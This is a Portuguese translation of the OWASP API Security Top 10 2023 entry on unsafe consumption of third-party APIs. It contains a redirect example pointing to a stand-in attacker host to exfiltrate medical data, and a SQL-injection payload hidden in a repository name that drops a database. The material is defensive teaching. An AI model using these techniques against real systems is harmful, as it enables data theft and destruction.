# API10:2023 Unsafe Consumption of APIs

| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |
| - | - | - |
| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Deteção **Moderado** | Técnico **Severo** : Específico Negócio |
| Explorar este problema requer que os atacantes identifiquem e potencialmente comprometam outras APIs/serviços com os quais a API alvo está integrada. Normalmente, esta informação não está disponível publicamente ou a API/serviço integrado não é facilmente explorável. | Os desenvolvedores tendem a confiar e não a verificar os _endpoints_ que interagem com APIs externas ou de terceiros, dependendo de requisitos de segurança mais fracos, como aqueles relacionados à segurança do transporte, autenticação/autorização e validação e sanitização de dados. Os atacantes precisam identificar os serviços com os quais a API alvo se integra (fontes de dados) e, eventualmente, comprometer esses serviços. | O impacto varia de acordo com o que a API alvo faz com os dados extraídos. A exploração bem sucedida pode levar à exposição de informações sensíveis a atores não autorizados, a vários tipos de injeções ou à negação de serviço. |

## A API é vulnerável?

Os desenvolvedores tendem a confiar mais nos dados recebidos de APIs de 
terceiros do que nos dados fornecidos por utilizadores. Isso é especialmente 
verdade para APIs oferecidas por empresas bem conhecidas. Por essa razão, os 
desenvolvedores tendem a adotar padrões de segurança mais fracos, especialmente 
no que diz respeito à validação e sanitização de dados.

A API pode estar vulnerável se:

* Interage com outras APIs através de um canal não encriptado;
* Não valida e sanitiza corretamente os dados recolhidos de outras APIs antes de
  os processar ou de os passar para componentes posteriores;
* Segue redirecionamentos cegamente;
* Não limita o número de recursos disponíveis para processar respostas de
  serviços de terceiros;
* Não implementa limites de tempo para interações com serviços de terceiros;

## Exemplos de Cenários de Ataque

### Cenário #1

Uma API depende de um serviço de terceiros para enriquecer os endereços 
comerciais fornecidos pelos utilizadores. Quando um endereço é fornecido pelo 
utilizador final à API, ele é enviado para o serviço de terceiros e os dados 
retornados são então armazenados numa base de dados local compatível com SQL.

Atacantes utilizam o serviço de terceiros para armazenar um conteúdo malicioso 
de injeção SQL (SQLi) associado a um negócio criado por eles. Em seguida, visam 
a API vulnerável fornecendo um conteúdo específico que faz com que esta obtenha 
o "negócio malicioso" do serviço de terceiros. O conteúdo de SQLi acaba por ser 
executado pela base de dados, exfiltrando dados para um servidor controlado pelo
atacante.

### Cenário #2

Uma API integra-se com um fornecedor de serviços de terceiros para armazenar com
segurança informações médicas sensíveis dos utilizadores. Os dados são enviados 
através de uma conexão segura usando um pedido HTTP como o abaixo:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Atacantes encontraram uma forma de comprometer a API de terceiros, que começa a 
responder com um `308 Permanent Redirect` a pedidos como o anterior.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Como a API segue cegamente os redirecionamentos do terceiro, ela repetirá 
exatamente o mesmo pedido, incluindo os dados sensíveis do utilizador, mas desta
vez para o servidor do atacante.

### Cenário #3

Um atacante pode preparar um repositório git chamado `'; drop db;--`.

Agora, quando uma integração de uma aplicação atacada é feita com o repositório 
malicioso, uma carga de injeção SQL é utilizada numa aplicação que constrói uma 
consulta SQL, acreditando que o nome do repositório é um conteúdo seguro.

## Como Prevenir

* Ao avaliar fornecedores de serviços, analise a postura de segurança das suas
  APIs.
* Garanta que todas as interações com APIs ocorram através de um canal de
  comunicação seguro (TLS).
* Valide e sanitize sempre os dados recebidos de APIs integradas antes de os
  utilizar.
* Mantenha uma lista de permissões de locais conhecidos para os quais as APIs
  integradas podem redirecionar a sua: não siga redirecionamentos cegamente.

## Referências

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### Externas

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html
